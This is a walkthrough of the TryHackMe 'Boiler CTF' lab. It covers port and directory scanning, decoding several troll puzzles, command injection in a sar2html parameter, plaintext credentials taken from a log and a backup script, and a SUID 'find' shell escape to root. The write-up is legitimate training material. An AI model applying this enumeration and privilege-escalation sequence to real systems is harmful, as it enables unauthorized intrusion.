# Boiler CTF


## Task 1

**All port nmap scan:**
```bash
jeffrowell@kali:~/Documents/TryHackMe/Boiler CTF$ nmap -p- -Pn -n -sC -sV -oN nmap/all_ports $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-22 22:39 MDT
Nmap scan report for 10.10.29.118
Host is up (0.17s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.21.42
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1371.43 seconds
```

### 1	File extension after anon login

```
txt
```

### 2 What is on the highest port?

```
SSH
```

### 3 What's running on port 10000?
```
Webmin
```

### 4 Can you exploit the service running on that port? (yay/nay answer)
```
nay
```

### 5 What's CMS can you access?
From the gobuster scan:
```
joomla
```

### 6 Keep enumerating, you'll know when you find it.
First thing I checked is the Anonymous login on the FTP server. Once logging in, we see there is a file `.info.txt`:
```bash
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
```

Grabbing that down and viewing the file gives us what seems to be ROT13:

```bash
ftp> get .info.txt
local: .info.txt remote: .info.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .info.txt (74 bytes).
226 Transfer complete.
74 bytes received in 0.00 secs (58.2318 kB/s)
```
```bash
jeffrowell@kali:~/Documents/TryHackMe/Boiler CTF$ cat .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

And it turns out it is just a troll:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Boiler CTF$ cat .info.txt | rot13
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!

```

To find what is running on the HTTP servers, using a combination of nikto and gobuster reveals some useful endpoints to enumerate later on.

**Initial nikto scan port 80:**
```bash
jeffrowell@kali:~/Documents/TryHackMe/Boiler CTF$ nikto -url http://$IP
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.29.118
+ Target Hostname:    10.10.29.118
+ Target Port:        80
+ Start Time:         2020-05-22 21:46:39 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 590af1b0312ce, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2020-05-22 22:07:28 (GMT-6) (1249 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

**Initial gobuster scan port 80:**
```bash
jeffrowell@kali:~/Documents/TryHackMe/Boiler CTF$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.29.118
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/22 21:46:25 Starting gobuster
===============================================================
/manual (Status: 301)
/joomla (Status: 301)
===============================================================
2020/05/22 22:08:21 Finished
===============================================================
```

Contents of `robots.txt`:
```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

The string at the bottom of the file looks suspicously like values in the range 0-255. Those are likely ASCII nums, so lets write a python script to decode those:

```python
#!/usr/bin/python3

import binascii
import base64


robots_string = "079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075"
decoded = [chr(int(n)) for n in robots_string.split()]
b64_decoded = base64.b64decode(''.join(decoded)).decode('utf-8').replace('\n', '')
print(b64_decoded)
```

After running the script to decode, this now looks like an MD5 hash:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Boiler CTF$ ./decode.py
99b0660cd95adea327c54182baa51584
```

Running this through hashcat gives us the string `kidding`, which seems to be another troll...

Now to enumerate the `/joomla` directory, we use gobuster once more:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Boiler CTF$ gobuster dir -u http://10.10.81.181/joomla/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.81.181/joomla/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/23 11:45:52 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/_archive (Status: 301)
/_database (Status: 301)
/_files (Status: 301)
/_test (Status: 301)
/~www (Status: 301)
/administrator (Status: 301)
/bin (Status: 301)
/build (Status: 301)
/cache (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/installation (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/templates (Status: 301)
/tests (Status: 301)
/tmp (Status: 301)
===============================================================
2020/05/23 11:47:12 Finished
===============================================================
```

Additionally running nikto on the `/joomla` directory found `/joomla/htaccess`, `/joomla/composer.json`, `/joomla/composer.lock`, `/joomla/~www` and also `/joomla/_archive/`. The `/joomla/_archive`, `/joomla/_files`, `/joomla/_database` and `/joomla/~www` directories just contain more trolls:

![troll](https://user-images.githubusercontent.com/32188816/82722031-15942a00-9c80-11ea-95b9-33b6e0c1327b.png)

![troll](https://user-images.githubusercontent.com/32188816/82737137-d8fe1800-9ceb-11ea-83dc-bc86c39843f3.png)

This turns out to me a caesar cipher with a key-shift of 2:

![shift](https://user-images.githubusercontent.com/32188816/82737187-41e59000-9cec-11ea-9f44-709449da772f.png)

And another troll... Looking at the `/joomla/_files` directory gives us a webpage with the string "VjJodmNITnBaU0JrWVdsemVRbz0K" in bold red text. This looks like base64, so lets try to decode:


![_files](https://user-images.githubusercontent.com/32188816/82721765-9dc50000-9c7d-11ea-88a4-3e61bc87a325.png)



```bash
jeffrowell@kali:~/Documents/TryHackMe/Boiler CTF$ echo 'VjJodmNITnBaU0JrWVdsemVRbz0K' | base64 -d
V2hvcHNpZSBkYWlzeQo=
jeffrowell@kali:~/Documents/TryHackMe/Boiler CTF$ echo 'VjJodmNITnBaU0JrWVdsemVRbz0K' | base64 -d | base64 -d
Whopsie daisy
```

And that was yet another troll... Finally in the `/joomla/_test/` directory it looks like we have found something to work with:

![_test](https://user-images.githubusercontent.com/32188816/82737214-9426b100-9cec-11ea-91b6-197405d19f28.png)

Looking around on the site we can notice that the parameter `?plot` at the end of the URL changes for each different operating system that we select, but more importantly it is reflected on the web page:

![reflectino](https://user-images.githubusercontent.com/32188816/82738392-6d6c7880-9cf4-11ea-87ba-971fa6ba8c1b.png)

This appears like a vector for a reflected XSS, and indeed it is:

![xss](https://user-images.githubusercontent.com/32188816/82738858-18cafc80-9cf8-11ea-8680-649516c38271.png)

So maybe we can execute other commands here, doing some recon we find that this is a [known exploit](https://www.exploit-db.com/exploits/47204), and will allow us to read arbitrary files. Executing an `ls` shows us that we have a file named `log.txt`:

![command_inject](https://user-images.githubusercontent.com/32188816/82738914-86772880-9cf8-11ea-8fe2-bac2656da0dc.png)


### 7 The interesting file name in the folder?
```
log.txt
```

## Task 2

![logs](https://user-images.githubusercontent.com/32188816/82739011-86c3f380-9cf9-11ea-93da-c4c0ad2e7fd6.png)

We can now log into the box with the credentials `basterd:superduperp@$$`

### 1 Where was the other users pass stored(no extension, just the name)?
Once we are logged in as the `basterd` user, we have a file `backup.sh` in our home directory. Looking at this file we find the password to the other user, `stoner`:

```bash
# cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log

DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows
```

### 2 user.txt
From here it is the same drill. Get linpeas on the box and enumerate. Running linpeas found that we can run `find` to get elevated privileges, as the SUID bit is set.

So, using the payload in [GTFOBins](https://gtfobins.github.io/gtfobins/find/) we are able to get root access, as it will set our effective user id (EUID) to root:

```bash
basterd@Vulnerable:~$ find . -exec /bin/sh -p \; -quit
# id
uid=1001(basterd) gid=1001(basterd) euid=0(root) groups=1001(basterd)
```

```bash
# ls /home/  
basterd  stoner
# ls -a /home/stoner
.  ..  .nano  .secret
# cat /home/stoner/.secret
You made it till here, well done.
```

### 3 What did you exploit to get the privileged user?
```
find
```

### 4 root.txt

```bash
# cat /root/root.txt
It wasn't that hard, was it?
```
